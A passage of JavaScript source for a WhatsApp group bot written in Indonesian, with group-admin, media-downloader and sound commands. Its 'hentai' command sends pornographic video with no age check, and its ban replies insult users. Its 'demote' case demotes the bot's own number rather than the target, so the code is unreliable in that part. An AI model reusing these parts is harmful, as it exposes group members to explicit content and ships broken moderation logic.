"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'OPEN', 
id: '.editinfo open',
}),
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "CLOSE",
id: `.editinfo close`,
}),
}
]
let teksd = `\`MODE EDIT INFO\``
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
reply('tunggu')
 if (args[0] === 'open'){
await gans.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await gans.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else {
 await gans.sendButText(teksd, 'Silahkan Pilih Button Dibawah', button, loe)
}
}
break
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
reply('tunggu')
let response = await gans.groupInviteCode(from)
let butt = [{
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "copy",
id: "123456789",
copy_code: `https://chat.whatsapp.com/${response}`,
})
}]
gans.sendButText(`${groupMetadata.subject}\n\nSilahkan Ketik Copy Untuk Menyalin Link Group`, "© Created By GansBOTz", butt, m)
}
break
case 'resetlinkgc':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
gans.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214280312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await gans.groupInviteCode(from)
gans.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'promoteall':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
reply('tunggu')
var groupe = await gans.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
gans.groupParticipantsUpdate(from, mems, 'promote')
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gans.groupParticipantsUpdate(from, [users], 'remove')
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
reply('tunggu')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gans.groupParticipantsUpdate(from, [users], 'promote')
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
reply('tunggu')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gans.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break
case 'everyone': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
await gans.sendMessage(m.chat, {
		text: `@${m.chat}`,
		contextInfo: {
			mentionedJid: (await gans.groupMetadata(m.chat)).participants.map(v => v.id),
			groupMentions: [{
				groupSubject: "Hallo Semua",
				groupJid: m.chat
			}]
		}
	})
}
break
case 'hidetag':
case 'h': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
gans.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
gans.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
                }
                reply(`Waktu tutup ${q} dimulai dari sekarang`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Waktu tutup* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
                    gans.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*Pilih:*\ndetik\nmenit\njam\n\n*example*\n10 detik')
                }
                reply(`Jam buka ${q} mulai dari sekarang`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Waktu buka* grup dibuka oleh admin\n sekarang anggota dapat mengirim pesan`
                    gans.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break

//=========Downloader menu====-=====\\
case 'tt': case 'ttmp4': case 'tiktok': {
if (!text) return reply('mana link nya')
reply(mess.wait)
gojo = await fongsi.TiktokVideo(text)
const { data } = gojo;
let cap = ` title: ${data.title}\n`
let media = {
video: {url:data.play}
}
let button = [
{
"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'HD', 
id: `.hdtt ${text}`,
})
},
{
"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'AUDIO', 
id: `.ttmp3 ${text}`,
})
}
]
gans.sendButtonMedia(m.chat, cap, `by Deff CDT Team`, media, button, m)
}
break
case 'ttmp3': {
if (!text) return reply('mana link nya')
reply(mess.wait)
gojo = await fongsi.TiktokVideo(text)
const { data } = gojo;
gans.sendMessage(m.chat, { audio: {url:data.music}, mimetype: 'audio/mp4', ptt: false, filename: 'tiktok.mp3' }, {quoted:m})
}
break
case 'hdtt': {
if (!text) return reply('mana link nya')
reply(mess.wait)
gojo = await fongsi.TiktokVideo(text)
const { data } = gojo;
gans.sendMessage(m.chat, { video: {url:data.hdplay}, caption: `title: ${data.title}` }, {quoted:m})
}
break
case 'twitter': case 'x': {
if (!text) return reply('mana link nya')
let x = await bocil.twitter(text)
let res = x[2];
let cap = `Resolution: ${res.height}p`
reply(mess.wait)
let media = {
video: {url:res.url}
}
let buttonz = [{
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"SUBSCRIBE\",\"url\":\"https://youtube.com/@survivofc\",\"merchant_url\":\"https://youtube.com/@survivofc\"}"
}]
gans.sendButtonMedia(m.chat, cap, 'by deffxdtz [C.D.T]', media, buttonz, m)
}
break
case 'igdl': case 'ig': case 'instagram': {
if (!text) return reply('mana link nya')
let igdl = await ruhend.igdl(text)
let res = igdl.data[0];
gans.sendMessage(m.chat, {
video: {url:res.url},
caption: `_Download Completed_`
}, {quoted:m})
}
break
case 'ttsearch': case 'ttscroll': case 'tiktoksearch': {
if (!text) return reply("Masukan Query!")
    let old = new Date();
    let json;
    try {
        json = await fetchJson(`https://blueline-sandy.vercel.app/api/search/tiktok?query=${text}`);
    } catch (err) {
        return m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`);
    }
    reply(mess.wait)
    
    var hiasan = "=> ";

    // Ensure json has enough elements
    if (!json || json.length < 8) return m.reply('Data tidak lengkap untuk membuat scroll.');

    let json1 = pickRandom([json.result.data.videos[0], json.result.data.videos[1], json.result.data.videos[3]]);
    let json2 = pickRandom([json.result.data.videos[5], json.result.data.videos[6], json.result.data.videos[7]]);
    let json3 = pickRandom([json.result.data.videos[8], json.result.data.videos[2]]);
    let json4 = pickRandom([json.result.data.videos[7], json.result.data.videos[3], json.result.data.videos[6]]);
    let json5 = pickRandom([json.result.data.videos[4], json.result.data.videos[0], json.result.data.videos[1]]);

    async function video(url) {
        if (!url) throw new Error('URL video tidak tersedia.');
        const { videoMessage } = await generateWAMessageContent({
            video: {
                url
            }
        }, {
            upload: gans.waUploadToServer
        });
        return videoMessage;
    }

    try {
        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: `result from ${text}`
                            },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            videoMessage: await video(json1.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json1.duration || 'N/A'} detik\n${hiasan}*Play* : ${json1.play_count || 0}\n${hiasan}*Download* : ${json1.download_count || 0}\n${hiasan}*Share* : ${json1.share_count || 0}\n${hiasan}*Comment* : ${json1.comment_count || 0}\n${hiasan}*Like* : ${json1.digg_count || 0}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json2.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json2.duration || 'N/A'} detik\n${hiasan}*Play* : ${json2.play_count || 0}\n${hiasan}*Download* : ${json2.download_count || 0}\n${hiasan}*Share* : ${json2.share_count || 0}\n${hiasan}*Comment* : ${json2.comment_count || 0}\n${hiasan}*Like* : ${json2.digg_count || 0}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json3.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json3.duration || 'N/A'} detik\n${hiasan}*Play* : ${json3.play_count || 0}\n${hiasan}*Download* : ${json3.download_count || 0}\n${hiasan}*Share* : ${json3.share_count || 0}\n${hiasan}*Comment* : ${json3.comment_count || 0}\n${hiasan}*Like* : ${json3.digg_count || 0}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json4.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json4.duration || 'N/A'} detik\n${hiasan}*Play* : ${json4.play_count || 0}\n${hiasan}*Download* : ${json4.download_count || 0}\n${hiasan}*Share* : ${json4.share_count || 0}\n${hiasan}*Comment* : ${json4.comment_count || 0}\n${hiasan}*Like* : ${json4.digg_count || 0}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json5.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json5.duration || 'N/A'} detik\n${hiasan}*Play* : ${json5.play_count || 0}\n${hiasan}*Download* : ${json5.download_count || 0}\n${hiasan}*Share* : ${json5.share_count || 0}\n${hiasan}*Comment* : ${json5.comment_count || 0}\n${hiasan}*Like* : ${json5.digg_count || 0}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [],
                                        },
                                    },

                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            }, {quoted:Ganss},
            {}
        );

        await gans.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengirim pesan.');
    }
}
break
case 'play': {
if (!text) return reply('masukan query judul lagu yang ingin dicari')
let cari = await yts(text)
reply(mess.wait)
let { all } = cari;
try {
let cap = `* Type: ${all[0].type}\n* Title: ${all[0].title}\n* Duration: ${all[0].timestamp}\n* Views: ${all[0].views}\n* Upload: ${all[0].ago}\n* Author: ${all[0].author.name}\n`
let foot = `© created by Deff [C.D.T]`
let media = {
image: {url:all[0].thumbnail}
}
let buttons = [
{
"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'VIDEO', 
id: `.ytmp4 ${all[0].url}`,
})
},
{
"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'AUDIO', 
id: `.ytmp3 ${all[0].url}`,
})
}
]
gans.sendButtonMedia(m.chat, cap, foot, media, buttons, m)
} catch {
let res = `* Type: ${all[0].type}\n* Name: ${all[0].title}\n* Id: ${all[0].id}\n* Subscribe: ${all[0].subCountLabel}\n* Verifed: ${all[0].verifed}`
let foot = `© created by Deff [C.D.T]`
let media = {
image: {url:all[0].thumbnail}
}
let buttons = [
 {
 "name": "cta_url",
 "buttonParamsJson": JSON.stringify({
 display_text: 'KUNJUNGI',
 url: all[0].url,
 merchant_url: all[0].url
 })
}
]
gans.sendButtonMedia(m.chat, res, foot, media, buttons, m)
}
}
break
case 'ytmp3': {
  if (!text) return reply('masukan link youtube yang di inginkan');
  let json;
  try {
  json = await fetchJson(`https://api-id.wzblueline.xyz/api/dl/ytmp3?url=${text}`);
  } catch (err) {
    return reply(`Terjadi kesalahan saat mengambil data: ${err.message}`);
    }
    json = await ruhend.ytmp3v3(text);
  let { title, audio } = json;
    reply(mess.wait)
    console.log(json)
  gans.sendMessage(m.chat, { audio: {url:audio}, mimetype: 'audio/mp4', filename: 'error.mp3', ptt: false }, {quoted:m});
}
break;
case 'ytmp4': {
  if (!text) return reply('masukan link youtube yang di inginkan');
  try {
  let json = await fongsi.YouTube.down(text);
  let { data } = json;
  reply(mess.wait)
  let cap = `* Title: ${data.title}\n* Duration: ${data.duration}\n* Author: ${data.author}`;
  let foot = `© Created by Deff [C.D.T]`;
  let media = {
    video: {url: data.videoUrl}
  };
  let buttons = [
    {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: text,
        merchant_url: text
      })
    }
  ];
  gans.sendButtonMedia(m.chat, cap, foot, media, buttons, m);
  } catch {
  let json = await ruhend.ytmp4v4(text);
  let { title, video } = json;
  let cap = `* Title: ${title}\n`;
  let foot = `© Created by Deff [C.D.T]`;
  let media = {
    video: {url: video}
  };
  let buttons = [
    {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: text,
        merchant_url: text
      })
    }
  ];
  gans.sendButtonMedia(m.chat, cap, foot, media, buttons, m);
  }
}
break;
case 'yts': case 'ytsearch': {
if (!args[0]) return reply('Masukan judul yang ingin dicari')
 let old = new Date();
    let json;
    try {
        json = await yts(text)
    } catch (err) {
        return m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`);
    }
    reply(mess.wait)
 if (!json || json.length < 10) return reply('Data tidak lengkap.');

    let json1 = json.all[0]
    let json2 = json.all[1]
    let json3 = json.all[2]
    let json4 = json.all[3]
    let json5 = json.all[4]
    let json6 = json.all[5]
    let json7 = json.all[6]
    let json8 = json.all[7]
    let json9 = json.all[8]
    let json10 = json.all[9]
    
 async function createImage(url) {
 if (!url) throw new Error('URL video tidak tersedia.');
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: gans.waUploadToServer
    });
    return imageMessage;
  }
try {
        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: `result from ${text}`
                            },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            imageMessage: await createImage(json1.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json1.type}\n* Title: ${json1.title}\n* Duration: ${json1.timestamp}\n* Views: ${json1.views}\n* Upload: ${json1.ago}\n* Author: ${json1.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json1.url,
        merchant_url: json1.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json1.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json2.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json2.type}\n* Title: ${json2.title}\n* Duration: ${json2.timestamp}\n* Views: ${json2.views}\n* Upload: ${json2.ago}\n* Author: ${json2.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json2.url,
        merchant_url: json2.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json2.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json3.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json3.type}\n* Title: ${json3.title}\n* Duration: ${json3.timestamp}\n* Views: ${json3.views}\n* Upload: ${json3.ago}\n* Author: ${json3.author.name}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json3.url,
        merchant_url: json3.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json3.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json4.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n* Type: ${json4.type}\n* Title: ${json4.title}\n* Duration: ${json4.timestamp}\n* Views: ${json4.views}\n* Upload: ${json4.ago}\n* Author: ${json4.author.name}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json4.url,
        merchant_url: json4.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json4.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json5.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json5.type}\n* Title: ${json5.title}\n* Duration: ${json5.timestamp}\n* Views: ${json5.views}\n* Upload: ${json5.ago}\n* Author: ${json5.author.name}\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json5.url,
        merchant_url: json5.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json5.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json6.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json6.type}\n* Title: ${json6.title}\n* Duration: ${json6.timestamp}\n* Views: ${json6.views}\n* Upload: ${json6.ago}\n* Author: ${json6.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json6.url,
        merchant_url: json6.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json6.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json7.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json7.type}\n* Title: ${json7.title}\n* Duration: ${json7.timestamp}\n* Views: ${json7.views}\n* Upload: ${json7.ago}\n* Author: ${json7.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json7.url,
        merchant_url: json7.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json7.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json8.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json8.type}\n* Title: ${json8.title}\n* Duration: ${json8.timestamp}\n* Views: ${json8.views}\n* Upload: ${json8.ago}\n* Author: ${json8.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json8.url,
        merchant_url: json8.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json8.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json9.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json9.type}\n* Title: ${json9.title}\n* Duration: ${json9.timestamp}\n* Views: ${json9.views}\n* Upload: ${json9.ago}\n* Author: ${json9.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json9.url,
        merchant_url: json9.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json9.url,
})
}
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json10.thumbnail),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ YOUTUBE - SEARCH ]\n\n* Type: ${json10.type}\n* Title: ${json10.title}\n* Duration: ${json10.timestamp}\n* Views: ${json10.views}\n* Upload: ${json10.ago}\n* Author: ${json10.author.name}\n\n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'KUNJUNGI',
        url: json10.url,
        merchant_url: json10.url
      })
    },
    {
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "SALIN TAUTAN",
id: "123456789",
copy_code: json10.url,
})
}
                                            ],
                                        },
                                    },

                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            }, {quoted:Ganss},
            {}
        );

        await gans.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengirim pesan.');
    }
}
break
case 'tiktokslide': case 'ttslide': {
if (!text) return reply('masukan link tiktok slide')
let down = await dylux.tiktok(`${text}`)
let { result } = down;
reply(mess.wait)
if (result.images.length > 0) {
for (let index = 0; index < result.images.length; index++) {
await new Promise(resolve => setTimeout(resolve, index * 1000));
gans.sendMessage(m.chat, { image: { url: result.images[index] }});
}
 await gans.sendMessage(m.chat, { audio: { url: result.play }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' });
} else {
reply("Tidak ada gambar yang ditemukan.");
}
}
break

//============Tempat video===============\\
case 'wmvideo':{
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = `${text}`
{
 if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await gans.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
}
break

case 'hentaivid': case 'hentai': case 'hentaivideo': {
                const { hentai } = require('./lib/scraper2.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                gans.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
//============Tempat sound===============\\
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 gansgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await gans.sendMessage(from, { audio: gansgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://e.top4top.io/p_31932kwdu1.jpg',
title: `GANS BOTZ`,
sourceUrl: `https://e.top4top.io/p_31932kwdu1.jpg`, 
thumbnail: thumb
}
}})
break

//============Tempat cpanel===============\\
case 'getapk': {
let urlnya = "https://www.mediafire.com/file/3bbbv54rl5r22bn/Private+panel+deff.apk/file"
let json = await dylux.mediafireDl(urlnya)
let { url, filename, ext, filesieB } = json;
